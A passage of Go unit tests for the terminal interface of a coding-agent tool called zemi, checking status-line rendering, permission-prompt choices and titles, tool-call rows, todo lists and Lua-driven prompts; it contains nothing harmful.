		t.Fatalf("a long command stops drifting without waiting: %q then %q", a, b)
	}
	long[0].Name = "read"
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: long})
	if a, b := row(0), row(800); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@..─") {
		t.Fatalf("the eyes do not read: %q then %q", a, b)
	}
	// the key and the clock end the rule, and the key keeps its column as the
	// clock gains digits, its reserved cells going into the margin
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 5 * time.Second})
	short := row(500)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 605 * time.Second})
	r := row(500)
	const status = " esc interrupt · 10m 05s "
	at := strings.Index(r, status)
	if at <= len(r)/2 || at != strings.Index(short, " esc interrupt · 5s") {
		t.Fatalf("the status is not pinned to the right end: %q then %q", short, r)
	}
	if !strings.HasSuffix(r, "10m 05s ───") || !strings.HasSuffix(short, "5s ────────") {
		t.Fatalf("the block does not end the rule: %q then %q", short, r)
	}
	// the open prompt says what answers it, so the rule shrinks to the snail
	// alone: no esc, which the prompt takes
	app.permAsk = &permAskPrompt{req: hostapi.PermRequest{Subject: "tool.shell", Arg: "make"}}
	if r := row(1000); r != "@??"+strings.Repeat("─", 75) {
		t.Fatalf("the snail does not ask while the user is asked: %q", r)
	}
	app.permAsk = nil
	host.SeedStream(hostapi.StreamSnapshot{})
	t.Logf("active=%v", host.AgentActive())
	if r := row(2500); !strings.HasPrefix(r, "@··─") {
		t.Fatalf("a turn with no outcome (/compact) bows: %q", r)
	}
	for _, c := range []struct {
		msg  turnDoneMsg
		eyes string
	}{{turnDoneMsg{}, "@^^─"}, {turnDoneMsg{err: "boom"}, "@><─"}, {turnDoneMsg{stopped: true}, "@··─"}} {
		// the host can still read active a frame after the turn reported
		host.SeedStream(hostapi.StreamSnapshot{Active: true})
		app.AgentStream()
		app.Update(c.msg)
		app.Update(frameTickMsg{})
		host.SeedStream(hostapi.StreamSnapshot{})
		t.Logf("active=%v", host.AgentActive())
		app.Update(frameTickMsg{})
		if r := row(2500); !strings.HasPrefix(r, c.eyes) {
			t.Fatalf("after %+v the snail reads %q, want %q", c.msg, r, c.eyes)
		}
	}
	// thinking blinks in place, its cycle starting with the state
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Reasoning: "hm", Thinking: true})
	if a, b := row(3210), row(3610); !strings.HasPrefix(a, "@.?") || !strings.HasPrefix(b, "@?.") {
		t.Fatalf("the thinking eyes do not change: %q then %q", a, b)
	}
	// a narrow rule drops the clock before the interrupt key
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	app.Update(tea.WindowSizeMsg{Width: 26, Height: 16})
	app.renderSync(t)
	if r := ansi.Strip(app.renderSegs(app.widgetLines("working")[0], 24)); !strings.Contains(r, "esc interrupt") || strings.Contains(r, "20s") {
		t.Fatalf("the narrow rule lost the interrupt key: %q", r)
	}
}

// TestWorkingRowAgentView: an agent view names the run the chat shows and the
// key that leaves it on the rule, alone while nothing runs, and keeps that key
// once the name is dropped for width.
func TestWorkingRowAgentView(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	db, err := store.Open(filepath.Join(t.TempDir(), "p.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	host.DB = db
	id := store.ShortID()
	if err := db.CreateSession(id, store.ShortID(), "run", "explore"); err != nil {
		t.Fatal(err)
	}
	if err := host.ViewAgent(id); err != nil {
		t.Fatal(err)
	}
	row := func(w int) string {
		app.Update(tea.WindowSizeMsg{Width: w, Height: 16})
		app.renderSync(t)
		segs := app.widgetLines("working")[0]
		if got := hostapi.SegsWidth(segs); got != w-2 {
			t.Fatalf("the rule is %d cells at %d wide, want %d", got, w, w-2)
		}
		return ansi.Strip(app.renderSegs(segs, w))
	}
	// idle: the run and its status, where the rule was bare before
	if r := row(80); !strings.Contains(r, " viewing explore · done · esc back ") {
		t.Fatalf("the idle rule does not name the viewed run: %q", r)
	}
	// a running turn takes the interrupt key, not the one that leaves the view
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	if r := row(80); !strings.Contains(r, "esc back") || strings.Contains(r, "esc interrupt") || !strings.Contains(r, "20s") {
		t.Fatalf("a turn in a view does not read back: %q", r)
	}
	// width sheds the name and the status first, never the key
	host.SeedStream(hostapi.StreamSnapshot{})
	if r := row(26); !strings.Contains(r, "esc back") || strings.Contains(r, "viewing") || strings.Contains(r, "done") {
		t.Fatalf("the narrow rule lost the back key or kept the name: %q", r)
	}
}

// TestLuaInput drives zemi.ui.input: typing edits the prefilled line, enter
// hands the text to on_confirm, esc hands it nil.
func TestLuaInput(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	open := `zemi.ui.input({ prompt = "Branch", default = "fix-" }, function(t) zemi.notify({ title = "input", body = t or "none" }) end)`

	runLua(t, app, open)
	if len(app.overlays) != 1 || app.overlays[0].o.Title != "Branch" {
		t.Fatalf("input overlay: %+v", app.overlays)
	}
	for _, r := range "lsp" {
		app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lastToast(app); got != "fix-lsp" {
		t.Fatalf("enter gave %q", got)
	}
	runLua(t, app, open)
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if got := lastToast(app); got != "none" || len(app.overlays) != 0 {
		t.Fatalf("esc gave %q, overlays %d", got, len(app.overlays))
	}
}

// TestConfigEdit: /config edit prompts with the key's value; enter sets it
// and leaves /config open, its row rebuilt, and a refused value toasts and
// changes nothing.
func TestConfigEdit(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)
	if err := host.ForceReload(t.Context(), []lua.BootStep{host.NamespacesStep(), host.BuiltinCommandsStep(), lua.RequireStep("zemi.tui")}); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		path, prefill, typed, desc, toast string
	}{
		{"editor.command", "", "vim", "this run  vim", ""},
		{"ui.composer.history", "50", "x", "default   50", "ui.composer.history is a number"},
	} {
		app.runCommand("config", "")
		app.runCommand("config", "edit "+c.path)
		for app.Pump() {
		}
		if st := app.overlays[len(app.overlays)-1]; !st.o.Input || st.input.text != c.prefill {
			t.Fatalf("%s: prompt %+v, text %q", c.path, st.o, st.input.text)
		}
		for _, r := range c.typed {
			app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
		}
		app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
		toast := lastToast(app)
		if len(app.overlays) != 1 || app.overlays[0].o.ID != "config" {
			t.Fatalf("%s: overlays after enter: %d", c.path, len(app.overlays))
		}
		i := slices.IndexFunc(app.overlays[0].o.Items, func(it any) bool { return it.(map[string]any)["text"] == c.path })
		if desc := app.overlays[0].o.Items[i].(map[string]any)["desc"]; desc != c.desc || c.toast != "" && !strings.Contains(toast, c.toast) {
			t.Errorf("%s: row %q, toast %q; want %q, %q", c.path, desc, toast, c.desc, c.toast)
		}
		app.cancelOverlay(app.overlays[0].o)
	}
}

// TestKeySequence: ctrl+x then t runs a <leader>t binding without typing
// the t; a key that breaks the sequence reaches the composer.
func TestKeySequence(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	runLua(t, app, `zemi.keymap.set("<leader>t", function() zemi.notify({ title = "seq", body = "ran" }) end)`)
	leader := tea.KeyPressMsg{Code: 'x', Mod: tea.ModCtrl}
	app.Update(leader)
	if len(app.keySeq) != 1 {
		t.Fatalf("pending = %v", app.keySeq)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	if lastToast(app) != "ran" || app.composer.text != "" {
		t.Fatalf("toasts=%v composer=%q", app.toasts, app.composer.text)
	}
	app.Update(leader)
	app.Update(tea.KeyPressMsg{Code: 'b', Text: "b"})
	if len(app.keySeq) != 0 || app.composer.text != "b" {
		t.Fatalf("broken sequence: pending=%v composer=%q", app.keySeq, app.composer.text)
	}
}

// TestPermissionChoices: up and down move between the choices, enter
// answers the highlighted one, and the letters answer directly; without an
// always choice there are three.
func TestPermissionChoices(t *testing.T) {
	app, _ := bootAgentApp(t, 100, 30)
	ask := func(req hostapi.PermRequest, keys ...tea.KeyPressMsg) (bool, string) {
		t.Helper()
		done := make(chan struct{})
		var ok bool
		var by string
		go func() { ok, by = app.AskPermission(req); close(done) }()
		waitPrompt(t, app, func() bool { return app.permAsk != nil })
		for _, k := range keys {
			app.Update(k)
		}
		<-done
		return ok, by
	}
	down, up, enter := tea.KeyPressMsg{Code: tea.KeyDown}, tea.KeyPressMsg{Code: tea.KeyUp}, tea.KeyPressMsg{Code: tea.KeyEnter}
	letter := func(r rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: r, Text: string(r)} }
	shell := func(always string) hostapi.PermRequest {
		return hostapi.PermRequest{Tool: "shell", Subject: "tool.shell", Arg: "go test ./...", Always: always}
	}
	for _, c := range []struct {
		name string
		req  hostapi.PermRequest
		keys []tea.KeyPressMsg
		ok   bool
		by   string
	}{
		{"down enter takes always", shell("allow go test"), []tea.KeyPressMsg{down, enter}, true, "user:always"},
		{"down down enter denies", shell("allow go test"), []tea.KeyPressMsg{down, down, enter}, false, "user"},
		{"up stays on yes", shell("allow go test"), []tea.KeyPressMsg{up, enter}, true, "user:once"},
		{"a takes always", shell("allow go test"), []tea.KeyPressMsg{letter('a')}, true, "user:always"},
		{"n denies", shell("allow go test"), []tea.KeyPressMsg{letter('n')}, false, "user"},
		{"without always, down enter denies", shell(""), []tea.KeyPressMsg{down, enter}, false, "user"},
		{"without always, a does nothing", shell(""), []tea.KeyPressMsg{letter('a'), letter('o')}, true, "user:once"},
		{"p takes this project", hostapi.PermRequest{Subject: "tool.shell", Arg: "git push", Always: "allow git push", Project: true}, []tea.KeyPressMsg{letter('p')}, true, "user:project"},
		{"r takes the repo-wide read", hostapi.PermRequest{Subject: "fs.read", Arg: "/repo/pkg/file.go", Always: "allow reads in /repo/pkg/ and below", Wider: "allow reads anywhere in /repo/"}, []tea.KeyPressMsg{letter('r')}, true, "user:wider"},
	} {
		if ok, by := ask(c.req, c.keys...); ok != c.ok || by != c.by {
			t.Errorf("%s: %v %q", c.name, ok, by)
		}
	}
}

// TestFileRowClickIDs: an opened edit's rows, its diff rows included, carry
// the id that folds it, and a step's grouped row carries the step's, which
// opens one row per call, each carrying its own.
func TestFileRowClickIDs(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "look first")
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "b.go", Status: "ok"})
	appendReply(host, "seen", hostapi.TurnStat{})
	host.AppendMessage("user", "fix it")
	appendReasoning(host, "how", hostapi.TurnStat{ThoughtMS: 6000})
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "edit", Input: "/w/a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7,2 +7,2 @@\n-old\n+new\n keep"},
		{Name: "read", Input: "c.go", Status: "ok", Output: "1\tpackage c"},
		{Name: "read", Input: "d.go", Status: "ok"},
	}})
	for _, c := range []struct {
		open string
		want map[string]string
	}{
		{"edit /w/a.go", map[string]string{
			"· 1 file":               "turn:2",
			"│ ✻ thought 6.0s":       "thought:5",
			"│ ✓ edit /w/a.go +1 -1": "tool:-1",
			"│ 7 - old":              "tool:-1",
			"│ 7 + new":              "tool:-1",
			"│ 8 keep":               "tool:-1",
			"│ read 2 files":         "step:-2",
		}},
		{"read 2 files", map[string]string{"│ ├ read c.go": "tool:-2", "│ └ read d.go": "tool:-3"}},
		// a nested call's own rows keep the line under its branch mark
		{"read c.go", map[string]string{"│ ├ read c.go": "tool:-2", "│ │ ⎿ 1 package c": "tool:-2"}},
	} {
		app.renderSync(t)
		x, y := findCell(t, app, c.open)
		clickAt(app, x, y)
		app.renderSync(t)
		_ = app.Frame() // compose fills lastRows
		click := map[string]string{}
		for _, row := range app.lastRows {
			text := strings.Join(strings.Fields(hostapi.SegsText(row)), " ")
			for _, s := range row {
				if s.Click != "" {
					click[text] = s.Click
				}
			}
		}
		for text, want := range c.want {
			if click[text] != want {
				t.Errorf("%q = %q, want %q (rows: %v)", text, click[text], want, click)
			}
		}
	}
}

// TestToolRows: on the live rail a step's unlabelled calls that only looked
// around are one row saying what they did, or their own row when there is one
// of them, a labelled one its own row with
// no command under it, while edits and failures keep their rows, every mark
// at column 2 behind the bar; a kept command shows the model's description
// with the command under it, and --reasoning shows every call.
func TestToolRows(t *testing.T) {
	longQ := "Delete the 8 leftover worktree-agent-* branches too? They are all merged into main, so their commits stay reachable and nothing is lost."
	app, host := bootAgentApp(t, 100, 80)
	host.AppendMessage("user", "fix it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "read", Input: "a.go", Status: "ok"},
		{Name: "read", Input: "b.go", Status: "ok"},
		{Name: "shell", Input: "go vet ./...", Label: "Vet the code", Status: "ok", Output: "vet clean"},
		{Name: "edit", Input: "a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7 +7 @@\n-old\n+new"},
		{Name: "shell", Input: "go test ./...", Label: "Run the unit tests", Status: "err", Output: "--- FAIL: TestX"},
		{Name: "grep", Input: strings.Repeat("pattern ", 30), Status: "ok"},
		{Name: "shell", Input: "cat > n.txt <<EOT\nfirst line\nEOT", Label: "Write notes", Status: "err"},
		{Name: "shell", Input: "printf a\nprintf b", Status: "err"},
		{Name: "shell", Input: "make slow", Label: "Build it", Status: "bg", Output: "still running, so it " + tools.JobHandoff + "job-1"},
		{Name: "job_start", Input: "npm run dev", Label: "Dev server", Status: "bg", Output: "started job-2 (npm run dev)"},
		// a collapsed failure counts every line it hides, the host's cut
		// included; a command's shows its end, where its error and exit status are
		{Name: "shell", Input: "go build", Label: "Build the binary", Status: "err", Output: "e1\ne2\ne3\n… 21 more lines\nl1\nl2\nl3\nl4\nl5\nl6"},
		// a verdict the user gave shows as one line under a stop mark; the model keeps the reason and the instructions
		{Name: "question", Input: "Name?", Label: "name", Status: "stopped", Output: "The user dismissed the questions. Stop and wait for them to say how to proceed."},
		{Name: "write", Input: "b.go", Status: "stopped", Output: "permission denied (user): fs.write /p/b.go: it asked because this project is not trusted (/trust)"},
		{Name: "plan", Input: "# Plan", Status: "ok", Output: "approved, saved to /data/plans/s1.md"},
		{Name: "plan", Input: "# Plan", Status: "ok", Output: "changes requested: use go"},
		// an answered question reads its header, then each question with its
		// answer: on one line when it fits, the answer under it when not
		{Name: "question", Input: "Which auth method?", Label: "auth method", Status: "ok", Output: "Which auth method?\tOAuth\t"},
		{Name: "question", Input: longQ, Label: "branch cleanup", Status: "ok", Output: longQ + "\tYes, delete them\t"},
		{Name: "question", Input: "Which store? +1 more", Label: "store, cache size", Status: "ok", Output: "Which store?\tsqlite\tonly for now\nHow large may the cache grow?\tnot answered\t"},
		{Name: "shell", Input: "make again", Label: "Compile again", Status: "run"},
	}})
	app.renderSync(t)
	// a rail this long shows its last six entries; every row is under test
	if err := host.ClickWidget(t.Context(), "chat", map[string]any{"id": "more:0"}); err != nil {
		t.Fatal(err)
	}
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	// the rail keeps every row's mark at column 2: nothing but the bar starts
	// a row (the composer's last three aside)
	rows := strings.Split(frame, "\r\n")
	for _, r := range rows[:len(rows)-3] {
		if r = strings.TrimSpace(r); r != "" && !strings.HasPrefix(r, "│") && !strings.HasPrefix(r, "▌") {
			t.Fatalf("a rail row starts off the bar: %q\n%s", r, frame)
		}
	}
	for _, q := range []string{"Which auth method?", "Delete the 8 leftover", "Which store?"} {
		if n := strings.Count(frame, q); n != 1 {
			t.Fatalf("%q shows %d times, want once:\n%s", q, n, frame)
		}
	}
	for _, want := range []string{
		"│ read 2 files", "│ vet the code", "│ search pattern pattern pattern", "│ ⧗ build it", "│     running as job-1", "│ ⧗ start dev server", "│     running as job-2",
		"│     … 27 more lines", "│     l4", "│     l6", "│ ✓ edit a.go", "+1 -1", "│ ✗ run the unit tests", "│   ⎿ go test ./...", "│     --- FAIL: TestX",
		"│   ⎿ cat > n.txt <<EOT first line EOT", "│ ✗ run printf a printf b",
		"│ ■ write b.go", "│   ⎿ denied by you", "│   ⎿ approved, saved to /data/plans/s1.md", "│   ⎿ changes requested: use go",
		"│ ■ ask name", "│   ⎿ Name?", "│     dismissed by you",
		"│ ✓ ask auth method", "│   ⎿ Which auth method?  OAuth", "│ ✓ ask branch cleanup", "│     Yes, delete them",
		"│ ✓ ask store, cache size", "│   ⎿ Which store?  sqlite", "│     note: only for now", "│     How large may the cache grow?  not answered",
	} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	if strings.Contains(frame, "vet clean") || strings.Contains(frame, "go vet ./...") || strings.Contains(frame, "7 - old") || strings.Contains(frame, "    e1") || strings.Index(frame, "… 27 more lines") > strings.Index(frame, "    l4") || strings.Contains(frame, "it asked because") || strings.Contains(frame, "Stop and wait") || strings.Contains(frame, "Implement it now") {
		t.Fatalf("command output shows only with --reasoning, a verdict row shows only the verdict:\n%s", frame)
	}
	// a call that only looked around reads as its step, a kept row keeps its
	// bold verb, a running one reads Dim beside its spinner
	hl := map[string]string{}
	for _, l := range printedLines(t, host, 98) {
		for _, s := range l {
			if _, ok := hl[s.Text]; !ok {
				hl[s.Text] = s.HL
			}
		}
	}
	if hl["read"] != "Normal" || hl["edit"] != "AgentToolName" || hl["compile"] != "Dim" {
		t.Fatalf("verbs: read %q, edit %q, compile %q", hl["read"], hl["edit"], hl["compile"])
	}
	frame = printedChat(t, host, 98)
	// every call, nested under its step's row behind its branch mark
	if !strings.Contains(frame, "│ └ read b.go") || !strings.Contains(frame, "│ read 2 files") || !strings.Contains(frame, "vet clean") || !strings.Contains(frame, "7 + new") {
		t.Fatalf("--reasoning must list every call:\n%s", frame)
	}
	// an open row keeps a multi-line command's lines, each a detail row
	rows = strings.Split(frame, "\r\n")
	for _, c := range []struct{ first, next string }{{"cat > n.txt <<EOT", "first line"}, {"printf a", "printf b"}} {
		col := func(r, s string) int { return ansi.StringWidth(r[:max(strings.Index(r, s), 0)]) }
		i := slices.IndexFunc(rows, func(r string) bool { return strings.Contains(r, c.first) })
		if i < 0 || i+1 == len(rows) || !strings.Contains(rows[i+1], c.next) || col(rows[i+1], c.next) != 6 {
			t.Fatalf("%q not under %q:\n%s", c.next, c.first, frame)
		}
	}
	// an expanded long input wraps instead of ending in an ellipsis: a lone
	// look-around call's row is that input, with no "1 pattern" row over it
	var words int
	for row := range strings.SplitSeq(frame, "\r\n") {
		words += strings.Count(row, "pattern")
	}
	if words != 30 {
		t.Fatalf("expanded input shows %d of 30 words:\n%s", words, frame)
	}
}

// TestRailWaitsOnNestedRun: a call whose work is another agent loop holds the
// turn, so its row says what the turn waits on in place of its verb, its own
// progress line under it unchanged; any other running call names its verb.
func TestRailWaitsOnNestedRun(t *testing.T) {
	app, host := bootAgentApp(t, 100, 24)
	host.AppendMessage("user", "review it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: []hostapi.StreamTool{
		{Name: "workflow", Status: "run", Label: "review", Detail: "2/5 agents · paused · picking the diff apart"},
		{Name: "agent", Status: "run", Label: "explore"},
		{Name: "read", Status: "run", Input: "a.go"},
	}})
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range []string{
		"│ ⠋ waiting on workflow review",
		"│   ⎿ 2/5 agents · paused · picking the diff apart",
		"│ ⠋ waiting on agent explore",
		"│ ⠋ read a.go",
	} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
}

// TestDigestCountsEveryFamily: a turn of one family's calls folds into its
// sentence, an MCP call counting under its server however many of its tools
// ran; a row an MCP call keeps of its own still reads as its name in words.
func TestDigestCountsEveryFamily(t *testing.T) {
	app, host := bootAgentApp(t, 100, 80)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "mcp_gitlab_get_commit", Input: "abc123", Status: "run"},
		{Name: "mcp_gitlab_get_commit", Input: "abc123", Status: "ok"},
		{Name: "mcp_gitlab_list_issues", Input: "state=open", Status: "ok"},
	}})
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range []string{"│ ⠋ gitlab get commit abc123", "│ called 2 gitlab tools"} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	host.SeedStream(hostapi.StreamSnapshot{})
	digests := func() []string {
		app.renderSync(t)
		var out []string
		for row := range strings.SplitSeq(ansi.Strip(app.Frame()), "\r\n") {
			if row = strings.TrimSpace(row); strings.HasPrefix(row, "· ") {
				out = append(out, row)
			}
		}
		return out
	}
	for _, c := range []struct {
		name  string
		tools []string
		want  string
	}{
		{"mcp", []string{"mcp_gitlab_get_commit", "mcp_gitlab_list_issues"}, "2 gitlab tools"},
		{"agent", []string{"agent"}, "1 agent run"},
		{"workflow", []string{"workflow"}, "1 workflow"},
		{"lua", []string{"lua"}, "1 script"},
		{"tool_search", []string{"tool_search"}, "1 tool"},
		{"lsp", []string{"lsp", "lsp"}, "2 symbols"},
	} {
		t.Run(c.name, func(t *testing.T) {
			host.AppendMessage("user", "go")
			for _, tool := range c.tools {
				host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: tool, Text: "x", Status: "ok"})
			}
			appendReply(host, "done", hostapi.TurnStat{})
			if got := digests(); !slices.Contains(got, "· "+c.want) {
				t.Fatalf("no digest %q in %q", c.want, got)
			}
		})
	}
}

// TestTodoRowsKeepTheLiveItem: a list longer than 12 items shows the item in
// progress and the pending ones first, and folds the done tail into one row.
func TestTodoRowsKeepTheLiveItem(t *testing.T) {
	for _, c := range []struct {
		h    int
		want []string
	}{
		{40, []string{"▸ step 13", "○ step 14", "✓ step 01", "✓ 2 done"}},
		// a short screen keeps a third of the chat for the list
		{14, []string{"▸ step 13", "○ step 14", "✓ step 01", "✓ 11 done"}},
	} {
		t.Run(strconv.Itoa(c.h), func(t *testing.T) { todoRows(t, c.h, c.want) })
	}
}

func todoRows(t *testing.T, h int, want []string) {
	app, host := bootAgentApp(t, 100, h)
	// the test host has no project dir, so no project store came with it
	db, err := store.Open(filepath.Join(t.TempDir(), "p.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	host.DB = db
	sid := store.ShortID()
	if err := host.DB.CreateSession(sid, "", "t", ""); err != nil {
		t.Fatal(err)
	}
	if err := host.ResumeSession(sid); err != nil {
		t.Fatal(err)
	}
	var todos []store.Todo
	for i := range 13 {
		todos = append(todos, store.Todo{Content: fmt.Sprintf("step %02d", i+1), Status: "done"})
	}
	todos[12].Status = "in_progress"
	todos = append(todos, store.Todo{Content: "step 14", Status: "pending"})
	if err := host.PipelineFor().TodosWrite(todos); err != nil {
		t.Fatal(err)
	}
	host.AppendMessage("user", "do it")
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range want {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	if strings.Contains(frame, "step 11") || strings.Contains(frame, "step 12") {
		t.Fatalf("the done tail must fold:\n%s", frame)
	}
}

// TestReasoningWrapKeepsWords: an expanded thought longer than the chat
// width wraps without losing or repeating words.
func TestReasoningWrapKeepsWords(t *testing.T) {
	_, host := bootAgentApp(t, 60, 40)
	var words []string
	for i := range 40 {
		words = append(words, fmt.Sprintf("w%02d", i))
	}
	host.AppendMessage("user", "why?")
	appendReasoning(host, strings.Join(words, " ")+"\n\nsecond paragraph", hostapi.TurnStat{ThoughtMS: 1000})
	var got []string
	for row := range strings.SplitSeq(printedChat(t, host, 58), "\r\n") {
		if body, ok := strings.CutPrefix(row, "│   "); ok {
			got = append(got, strings.Fields(body)...)
		}
	}
	if want := append(words, "second", "paragraph"); strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("wrapped words:\n%s", strings.Join(got, " "))
	}
}

func TestStreamEventsCoalesce(t *testing.T) {
	app := &App{testQueue: make(chan tea.Msg, hookQueueSize), log: slog.New(slog.DiscardHandler), focused: true, now: time.Now}
	for range 3 * hookQueueSize {
		app.AgentStream()
	}
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("queued %d stream events, want 1", n)
	}
	app.TurnDone("", false)
	if n := len(app.testQueue); n != 2 {
		t.Fatalf("turn_done must always queue, got %d", n)
	}
	for app.Pump() {
	}
	app.AgentStream()
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("a handled event must let the next one queue, got %d", n)
	}
}

// TestReasoningPaneAirRows: a run whose thought wraps to two lines draws air
// rows in its rail, whose bar the pane strips: they keep a segment, since an
// empty widget line is an error.
func TestReasoningPaneAirRows(t *testing.T) {
	app, host := bootAgentApp(t, 120, 30)
	if err := host.ToggleReasoning(); err != nil {
		t.Fatal(err)
	}
	waitPrompt(t, app, func() bool { return !host.Layout().Root.Children[1].Children[1].Children[1].Children[1].Hidden })
	host.AppendMessage("user", "look around")
	appendReasoning(host, "where to start\nand where to go", hostapi.TurnStat{ThoughtMS: 1200})
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "a.go", Status: "ok"})
	appendReply(host, "done", hostapi.TurnStat{})
	app.renderSync(t)
	x, y := findCell(t, app, "· 1 file · thought 1.2s")
	clickAt(app, x+2, y)
	for app.Pump() {
	}
	app.renderSync(t)
	if frame := ansi.Strip(app.Frame()); !strings.Contains(frame, "and where to go") {
		t.Fatalf("the pane did not draw the inspected run:\n%s", frame)
	}
	if err := host.RT.ExecuteChunk(t.Context(), `local n = #zemi.errors.list(); assert(n == 0, "errors: " .. n)`, "t.lua", lua.OriginUser); err != nil {
		t.Fatal(err)
	}
}

// TestWidgetErrorRecordedOnce: a widget whose render raises is recorded in
// /errors once, not once per frame.
func TestWidgetErrorRecordedOnce(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)
	run := func(src string) {
		t.Helper()
		if err := host.RT.ExecuteChunk(context.Background(), src, "w.lua", lua.OriginUser); err != nil {
			t.Fatal(err)
		}
	}
	run(`zemi.ui.widget.add({ id = "bad", region = "statusline.right", render = function() error("boom") end })`)
	for range 10 {
		for app.Pump() {
		}
		if cmd := app.renderStaleWidgetsCmd(false); cmd != nil {
			app.Update(cmd())
		}
	}
	run(`local n = #zemi.errors.list(); assert(n == 1, "errors: " .. n)`)
}

// TestPermTitle: the prompt asks in words, from the request's typed fields,
// and its first fact names what the request acts on.
func TestPermTitle(t *testing.T) {
	for _, c := range []struct {
		req           hostapi.PermRequest
		title, target string // target: the fact's name and text, "" for none
	}{
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make", Where: hostapi.RunsOutside, Runs: []perm.Program{{Name: "make"}}}, "Run this command outside the sandbox?", "runs make"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make", Where: hostapi.RunsNoSandbox}, "Run this command?", "runs unknown: read the command"},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "true", Where: hostapi.RunsNetwork, Runs: []perm.Program{}}, "Run this command in the sandbox, with the network?", ""},
		{hostapi.PermRequest{Subject: "tool.shell", Arg: "make", Where: hostapi.RunsConfined, Runs: []perm.Program{{Name: "make"}}}, "Run this command in the sandbox?", "runs make"},
		{hostapi.PermRequest{Tool: "skill", Subject: "fs.read", Arg: "/p/skills/x/SKILL.md"}, "Load this skill?", "file skills/x/SKILL.md"},
		{hostapi.PermRequest{Tool: "read", Subject: "fs.read", Arg: "/etc/hosts"}, "Read this file?", "file /etc/hosts"},
		{hostapi.PermRequest{Tool: "write", Subject: "fs.write", Arg: "/p/a.go"}, "Write this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "edit", Subject: "fs.write", Arg: "a.go"}, "Edit this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "lsp", Subject: "fs.write", Arg: "a.go"}, "Change this file?", "file a.go"},
		{hostapi.PermRequest{Tool: "web_search", Subject: "net.lite.duckduckgo.com", Arg: "https://lite.duckduckgo.com/lite/?q=zemi"}, "Search the web?", "url https://lite.duckduckgo.com/lite/?q=zemi"},
		{hostapi.PermRequest{Tool: "fetch", Subject: "net.docs.example.com", Arg: "https://docs.example.com/api"}, "Fetch this URL?", "url https://docs.example.com/api"},
		{hostapi.PermRequest{Tool: "mcp_github_create_issue", Subject: "mcp.github", Arg: "create_issue"}, "Use create_issue from github?", ""},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "script"}, "Run Lua inside zemi?", ""},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "/p/x.lua"}, "Run Lua inside zemi?", "file x.lua"},
		{hostapi.PermRequest{Tool: "workflow", Subject: "tool.workflow", Arg: "review"}, "Run this workflow?", "workflow review"},
		{hostapi.PermRequest{Tool: "jira_create", Subject: "tool.jira_create", Arg: "jira_create"}, "Use the jira_create tool?", ""},
		{hostapi.PermRequest{Tool: "memory", Subject: "memory.write", Arg: "prefers tabs"}, "Forget this memory?", ""},
		{hostapi.PermRequest{Subject: "lua.fs.write", Arg: "x"}, "Allow lua.fs.write?", "arg x"},
	} {
		rows, _, _ := permFacts(c.req, "/p", 200, 40)
		var words []string
		for _, r := range rows {
			words = append(words, strings.Fields(hostapi.SegsText(r))...)
		}
		if title, target := permTitle(c.req), strings.Join(words, " "); title != c.title || target != c.target {
			t.Errorf("%+v: %q %q", c.req, title, target)
		}
	}
}

// TestPaneInspectsEarlierTurn: with the pane drawn, a click on an earlier
